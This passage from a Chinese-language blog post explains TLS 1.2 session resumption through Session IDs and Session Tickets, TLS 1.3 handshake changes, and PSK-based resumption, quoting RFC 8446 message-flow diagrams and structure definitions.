8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/5.jpeg" alt></p><p>&#x5728;&#x63E1;&#x624B;&#x5B8C;&#x6210;&#x4E4B;&#x524D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F; Finished &#x4E4B;&#x524D;&#xFF0C;Server &#x4F1A;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; New Session Ticket &#x7684;&#x65B0; TLS &#x6D88;&#x606F;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x52A0;&#x5BC6;&#x7684;&#x4F1A;&#x8BDD;&#x4FE1;&#x606F;&#xFF08;&#x5982;&#x4E3B;&#x5BC6;&#x3001;&#x4F7F;&#x7528;&#x7684;&#x5BC6;&#x7801;&#x7B49;&#xFF09;&#xFF0C;Server &#x53EF;&#x4EE5;&#x5728;&#x7A0D;&#x540E;&#x4F7F;&#x7528;&#x5B83;&#x4E13;&#x95E8;&#x4E3A;&#x6B64;&#x751F;&#x6210;&#x7684;&#x552F;&#x4E00;&#x5BC6;&#x94A5;&#x8FDB;&#x884C;&#x89E3;&#x5BC6;&#x3002;&#x4ECE;&#x8FD9;&#x4E00;&#x70B9;&#x5F00;&#x59CB;&#xFF0C;Client &#x4F1A;&#x5C06; Session Ticket &#x4FDD;&#x5B58;&#x5728;&#x5B83;&#x7684; TLS &#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x76F4;&#x5230;&#x4E0B;&#x4E00;&#x6B21;&#x5B83;&#x5728; Session Ticket&#x8FC7;&#x671F;&#x4E4B;&#x524D;&#x90FD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5B83;&#x4E0E;&#x4E4B;&#x524D;&#x7684; Server &#x6062;&#x590D; TLS &#x4F1A;&#x8BDD;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/6.jpeg" alt></p><p>&#x73B0;&#x5728;&#xFF0C;&#x5F53; Client &#x60F3;&#x8981;&#x91CD;&#x65B0;&#x4F7F;&#x7528;&#x4E4B;&#x524D;&#x7684;&#x4F1A;&#x8BDD;&#x65F6;&#xFF0C;&#x5B83;&#x5728; Client Hello &#x6D88;&#x606F;&#x7684; SessionTicket TLS Extension &#x4E2D;&#x53D1;&#x9001;&#x4E86; Session Ticket&#xFF0C;&#x6B64;&#x65F6;&#x6211;&#x4EEC;&#x6240;&#x6CE8;&#x610F;&#x5230;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4E5F;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x4F1A;&#x8BDD; ID &#xFF0C;&#x7528;&#x4E8E;&#x4EE5;&#x4E0B;&#x76EE;&#x7684;&#xFF1A;</p><ul><li>&#x670D;&#x52A1;&#x5668;&#x56DE;&#x590D;&#x76F8;&#x540C;&#x7684; Session ID &#x8868;&#x793A; Server &#x63A5;&#x53D7; Session Ticket &#xFF0C;&#x5E76;&#x5C06;&#x91CD;&#x7528;&#x8BE5; Session &#x3002;</li><li>&#x670D;&#x52A1;&#x5668;&#x56DE;&#x590D;&#x7A7A;&#x7684;/&#x4E0D;&#x540C;&#x7684; Session ID &#xFF1A;Server &#x51B3;&#x5B9A;&#x8FDB;&#x884C;&#x5B8C;&#x5168;&#x63E1;&#x624B;&#xFF0C;&#x539F;&#x56E0;&#x662F;&#x53EF;&#x80FD;&#x662F; Session Ticket &#x8FC7;&#x671F;&#x4E86;&#xFF0C;&#x6216;&#x8005;&#x5B83;&#x6B63;&#x5728;&#x6062;&#x590D;&#x539F;&#x6765;&#x7684;&#x4F1A;&#x8BDD;&#x3002;<br>PS&#xFF1A;&#x8FD9;&#x6837;&#x7684; Session ID &#x5E76;&#x4E0D;&#x5B58;&#x50A8;&#x5728; Server &#x4E0A;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x7834;&#x574F;&#x65E0;&#x72B6;&#x6001;&#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x7684;&#x76EE;&#x7684;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x6B21;&#x6027;&#x4F7F;&#x7528;&#xFF0C;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x5411; Client &#x8868;&#x793A; Server &#x63A5;&#x53D7;&#x4E86;&#x4ED6;&#x4EEC;&#x53D1;&#x9001;&#x7684;session ticket&#x3002;</li></ul><p>&#x5728;&#x4E0A;&#x8FF0;&#x7684;&#x4F8B;&#x5B50;&#x4E2D;&#xFF0C;Server &#x6210;&#x529F;&#x63A5;&#x53D7;&#x5E76;&#x91CD;&#x7528;&#x4E86; TLS &#x4F1A;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x786E;&#x8BA4;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x4E2A; Abbreviated TLS &#x63E1;&#x624B;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7684; Server Hello &#x6D88;&#x606F;&#x4E2D;&#xFF0C;Server &#x56DE;&#x590D;&#x4E86;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x76F8;&#x540C; Session ID &#x3002;&#x8FD9;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x57FA;&#x4E8E; Session Ticket &#x673A;&#x5236;&#x7684; Session Resumption &#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x4E0D;&#x9700;&#x8981;&#x5728;&#x672C;&#x5730;&#x5B58;&#x50A8;&#x4F1A;&#x8BDD;&#x4FE1;&#x606F;&#xFF0C;&#x56E0;&#x6B64;&#x4E0E;&#x6709;&#x72B6;&#x6001;&#x7684;&#x4F1A;&#x8BDD;&#x6062;&#x590D;&#x76F8;&#x6BD4;&#xFF0C;&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x66F4;&#x5177;&#x6269;&#x5C55;&#x6027;&#x7684;&#x9009;&#x62E9;&#x3002;</p><h3 id="TLS-1-3"><a href="#TLS-1-3" class="headerlink" title="TLS 1.3"></a>TLS 1.3</h3><h4 id="TLS-1-3-Overview"><a href="#TLS-1-3-Overview" class="headerlink" title="TLS 1.3 Overview"></a>TLS 1.3 Overview</h4><p>TLS 1.3 &#x53EF;&#x4EE5;&#x8BF4;&#x662F; TLS 1.2 &#x7684;&#x5347;&#x7EA7;&#x7248;&#x672C;&#xFF0C;&#x5B83;&#x5728; RFC 8446 &#x4E2D;&#x5B9A;&#x4E49;&#xFF0C;&#x4E8E; 2018 &#x5E74; 8 &#x6708;&#x53D1;&#x8868;&#x3002;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x7B80;&#x8981;&#x7684;&#x4ECB;&#x7ECD;&#x51E0;&#x4E2A;&#x6211;&#x4EEC;&#x6BD4;&#x8F83;&#x5173;&#x5FC3;&#x7684;&#x6539;&#x52A8;&#xFF1A;</p><ul><li>&#x51CF;&#x5C11;&#x63E1;&#x624B;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x5C06;&#x63E1;&#x624B;&#x65F6;&#x95F4;&#x4ECE; 2-RTT &#x964D;&#x4F4E;&#x5230; 1-RTT&#xFF0C;&#x5E76;&#x4E14;&#x589E;&#x52A0; 0-RTT &#x6A21;&#x5F0F;&#x3002;</li><li>&#x5E9F;&#x9664; Session ID &#x548C; Session Ticket &#x4F1A;&#x8BDD;&#x6062;&#x590D;&#x65B9;&#x5F0F;&#xFF0C;&#x7EDF;&#x4E00;&#x901A;&#x8FC7; PSK &#x7684;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x4F1A;&#x8BDD;&#x6062;&#x590D;&#xFF0C;&#x5E76;&#x5728; NewSessionTicket &#x6D88;&#x606F;&#x4E2D;&#x6DFB;&#x52A0;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x548C;&#x7528;&#x4E8E;&#x6DF7;&#x6DC6;&#x65F6;&#x95F4;&#x7684;&#x504F;&#x79FB;&#x503C;&#x3002;</li></ul><p>&#x5728;&#x63E1;&#x624B;&#x65F6;&#x76F8;&#x5BF9;&#x4E8E; TLS 1.2 &#x53D1;&#x751F;&#x4E86;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#x7684;&#x6539;&#x52A8;&#xFF1A;</p><ol><li>&#x4E0E; TLS 1.2 &#x63E1;&#x624B;&#x7C7B;&#x4F3C;&#xFF0C;TLS 1.3 &#x63E1;&#x624B;&#x4EE5; Client Hello &#x6D88;&#x606F;&#x5F00;&#x59CB;&#xFF0C;&#x4F46;&#x6709;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x53D8;&#x5316;&#x5C31;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x652F;&#x6301;&#x7684;&#x52A0;&#x5BC6;&#x5957;&#x4EF6;&#x5217;&#x8868;&#xFF0C;&#x5E76;&#x731C;&#x6D4B;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x80FD;&#x9009;&#x62E9;&#x7684;&#x5BC6;&#x94A5;&#x534F;&#x8BAE;&#x534F;&#x8BAE;&#xFF0C;&#x4E5F;&#x4F1A;&#x53D1;&#x9001;&#x5B83;&#x5BF9;&#x8BE5;&#x7279;&#x5B9A;&#x5BC6;&#x94A5;&#x534F;&#x8BAE;&#x534F;&#x8BAE;&#x7684;&#x5BC6;&#x94A5;&#x5171;&#x4EAB;&#x3002;</li><li>Server &#x5728;&#x56DE;&#x590D; Server Hello &#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x56DE;&#x590D;&#x5B83;&#x6240;&#x9009;&#x62E9;&#x7684;&#x5BC6;&#x94A5;&#x534F;&#x8BAE;&#x534F;&#x8BAE;&#xFF0C;&#x5176;&#x4E2D;&#x4E5F;&#x5305;&#x62EC;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5BC6;&#x94A5;&#x5171;&#x4EAB;&#x3001;&#x8BC1;&#x4E66;&#x4EE5;&#x53CA; Server Finished &#x3002;</li><li>&#x73B0;&#x5728;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x68C0;&#x67E5;&#x670D;&#x52A1;&#x5668;&#x8BC1;&#x4E66;&#xFF0C;&#x751F;&#x6210;&#x5BC6;&#x94A5;&#xFF0C;&#x5E76;&#x53D1;&#x9001; Client Finished &#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x52A0;&#x5BC6;&#x6570;&#x636E;&#x4E86;&#x3002;</li></ol><p>&#x8FD9;&#x6837;&#x4E00;&#x6765;&#xFF0C;TLS 1.3 &#x63E1;&#x624B;&#x5C31;&#x8282;&#x7701;&#x4E86;&#x6574;&#x6574;&#x4E00;&#x4E2A;&#x6765;&#x56DE;&#x548C;&#x6570;&#x767E;&#x6BEB;&#x79D2;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6BD4; TLS 1.2 &#x63E1;&#x624B;&#x6709;&#x4E86;&#x5F88;&#x5927;&#x7684;&#x6539;&#x8FDB;&#x3002;RFC 8446 &#x63D0;&#x4F9B;&#x7684;&#x7B80;&#x8981;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">      <span class="hljs-built_in"> Client </span>                                          Server</span><br><span class="line"></span><br><span class="line">Key  ^ ClientHello</span><br><span class="line">Exch | + key_share*</span><br><span class="line">     | + signature_algorithms*</span><br><span class="line">     | + psk_key_exchange_modes*</span><br><span class="line">     v + pre_shared_key*       --------&gt;</span><br><span class="line">                                                  ServerHello  ^ Key</span><br><span class="line">                                                 + key_share*  | Exch</span><br><span class="line">                                            + pre_shared_key*  v</span><br><span class="line">                                        {EncryptedExtensions}  ^  Server</span><br><span class="line">                                        {CertificateRequest*}  v  Params</span><br><span class="line">                                               {Certificate*}  ^</span><br><span class="line">                                         {CertificateVerify*}  | Auth</span><br><span class="line">                                                   {Finished}  v</span><br><span class="line">                               &lt;--------  [Application Data*]</span><br><span class="line">     ^ {Certificate*}</span><br><span class="line">Auth | {CertificateVerify*}</span><br><span class="line">     v {Finished}              --------&gt;</span><br><span class="line">       [Application Data]      &lt;-------&gt;  [Application Data]</span><br><span class="line"></span><br><span class="line">              +  Indicates noteworthy extensions sent <span class="hljs-keyword">in</span> the</span><br><span class="line">                 previously noted message.</span><br><span class="line"></span><br><span class="line">              *  Indicates optional <span class="hljs-keyword">or</span> situation-dependent</span><br><span class="line">                 messages/extensions that are <span class="hljs-keyword">not</span> always sent.</span><br><span class="line"></span><br><span class="line">              {} Indicates messages protected using keys</span><br><span class="line">                 derived <span class="hljs-keyword">from</span> a [sender]_handshake_traffic_secret.</span><br><span class="line"></span><br><span class="line">              [] Indicates messages protected using keys</span><br><span class="line">                 derived <span class="hljs-keyword">from</span> [sender]_application_traffic_secret_N.</span><br><span class="line"></span><br><span class="line">               Figure 1: Message Flow <span class="hljs-keyword">for</span> Full TLS Handshake</span><br></pre></td></tr></tbody></table></figure><p></p><p>TLS 1.2 &#x4E0E; 1.3 &#x7B80;&#x8981;&#x7684;&#x63E1;&#x624B;&#x5BF9;&#x6BD4;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/7.png" alt></p><h4 id="TLS-1-3-Session-Resumption-PSK"><a href="#TLS-1-3-Session-Resumption-PSK" class="headerlink" title="TLS 1.3 Session Resumption - PSK"></a>TLS 1.3 Session Resumption - PSK</h4><p>&#x6309;&#x7167;&#x4E0A;&#x6587;&#x6240;&#x8BF4;&#xFF0C;TLS 1.3 &#x7528;&#x901A;&#x8FC7;&#x9884;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#xFF08;Pre-Shared Key, PSK&#xFF09;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x7684;&#x6982;&#x5FF5;&#x53D6;&#x4EE3;&#x4E86; 1.2 &#x5F53;&#x4E2D;&#x7684; Session ID &#x548C; Session Ticket &#x3002;&#x5728;&#x6700;&#x521D;&#x7684;&#x63E1;&#x624B;&#x4E4B;&#x540E;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x4E00;&#x4E2A; PSK &#x6807;&#x8BC6;&#x3002; PSK &#x5185;&#x5BB9;&#x53D6;&#x51B3;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53EF;&#x80FD;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x5BC6;&#x94A5;&#x6216;&#x4E00;&#x4E2A;&#x81EA;&#x6211;&#x52A0;&#x5BC6;&#x548C;&#x81EA;&#x6211;&#x8BA4;&#x8BC1;&#x7684;&#x7968;&#x636E;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x6B64;PSK&#x8EAB;&#x4EFD;&#x4E0E;&#x81EA;&#x5DF1;&#x7684;&#x4F1A;&#x8BDD;&#x5BC6;&#x94A5;&#x4E00;&#x8D77;&#x5B58;&#x50A8;&#x3002;&#x5176;&#x4E2D;&#xFF0C; RFC 8446 &#x5B9A;&#x4E49;&#x7684; PSK &#x7ED3;&#x6784;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct {</span><br><span class="line">    opaque identity&lt;<span class="hljs-number">1.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">    <span class="hljs-built_in">uint</span>32 obfuscated_ticket_age;</span><br><span class="line">} PskIdentity;</span><br><span class="line"></span><br><span class="line">opaque PskBinderEntry&lt;<span class="hljs-number">32.</span><span class="hljs-number">.255</span>&gt;;</span><br><span class="line"></span><br><span class="line">struct {</span><br><span class="line">    PskIdentity identities&lt;<span class="hljs-number">7.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">    PskBinderEntry binders&lt;<span class="hljs-number">33.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">} OfferedPsks;</span><br><span class="line"></span><br><span class="line">struct {</span><br><span class="line">    select (Handshake.msg_type) {</span><br><span class="line">        <span class="hljs-keyword">case</span> client_hello: OfferedPsks;</span><br><span class="line">        <span class="hljs-keyword">case</span> server_hello: <span class="hljs-built_in">uint</span>16 selected_identity;</span><br><span class="line">    };</span><br><span class="line">} PreSharedKeyExtension;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x968F;&#x540E;&#x7684;&#x63E1;&#x624B;&#x4E2D;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x7684; ClientHello &#x6D88;&#x606F;&#x4E2D;&#x63D0;&#x4F9B;&#x8FD9;&#x4E2A; PSK &#xFF0C;&#x670D;&#x52A1;&#x5668;&#x6839;&#x636E; PSK &#x7684;&#x5185;&#x5BB9;&#x5BF9;&#x7968;&#x636E;&#x8FDB;&#x884C;&#x89E3;&#x5BC6;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x5305;&#x542B;&#x7684;&#x4F1A;&#x8BDD;&#x5BC6;&#x94A5;&#x548C;&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#x6765;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#xFF0C;&#x6216;&#x8005;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;&#x5305;&#x542B;&#x7684;&#x67E5;&#x627E;&#x5BC6;&#x94A5;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x627E;&#x4F1A;&#x8BDD;&#x5BC6;&#x94A5;&#x548C;&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#x3002; RFC 8446 &#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A; Session Resumption &#x7684;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">      <span class="hljs-built_in"> Client </span>                                              Server</span><br><span class="line"></span><br><span class="line">Initial Handshake:</span><br><span class="line">       ClientHello</span><br><span class="line">       + key_share               --------&gt;</span><br><span 